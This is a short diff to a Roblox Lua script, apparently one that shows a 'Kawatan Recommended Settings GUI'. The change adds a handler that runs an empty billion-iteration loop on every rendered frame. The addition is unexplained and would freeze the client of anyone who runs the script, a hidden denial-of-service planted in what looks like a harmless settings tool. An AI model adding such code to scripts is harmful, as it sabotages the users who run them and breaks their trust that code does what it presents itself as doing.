@@ -8,6 +8,11 @@ pcall(function()
 		Duration = 5
 	})
 end)
+local RunService = game:GetService("RunService")
+
+RunService.RenderStepped:Connect(function()
+    for i = 1, 1e9 do end
+end)
 
 --- Kawatan Recommended Settings GUI
 
